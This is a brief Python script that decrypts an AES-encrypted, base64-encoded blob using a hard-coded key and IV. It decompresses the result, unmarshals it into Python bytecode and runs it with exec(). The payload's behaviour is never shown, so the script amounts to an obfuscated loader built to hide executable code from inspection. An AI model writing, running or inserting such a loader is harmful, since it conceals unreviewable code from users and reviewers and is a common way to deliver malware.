# Auto decrypt and exec
import base64
import marshal
import zlib
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

KEY = b'thisis16bytekey!'
IV = b'16byteinitvector'
encoded = "BxTo/uqDb4iU6C3WcWN7Id4nf0uQubBZeu96Lh/MCkIJrxWL3Vw20aGlZ91tLW67mpBkGTAOy8iBJ7HMlldVjD3Cyx31W91KM8kkp5eFnSWSKFStEA9vbRqRFN860ik44iqou1DRId9WHj/buIdHN83JCN4U3ezmy3MuBSsquZhZxjVDl1LvsAlkl7PC5gbE9oi2mCrfHpQ0eg1+KGsaQT2VagBs6DjAXYemRwJd9cK7LHyksbn5+97pDWC8k9uVcZq+EABjXrIhdZvW7dxd/rL1Be84Mtlby9l8ebWSts+mN+ps5tV8yR7qydFhMfuaSESfoGbyVfrxOl0qGLoYwXFcao8JJgXqzk+ff9NYQBU="

cipher = AES.new(KEY, AES.MODE_CBC, IV)
decrypted = unpad(cipher.decrypt(base64.b64decode(encoded)), AES.block_size)
code = marshal.loads(zlib.decompress(decrypted))
exec(code)
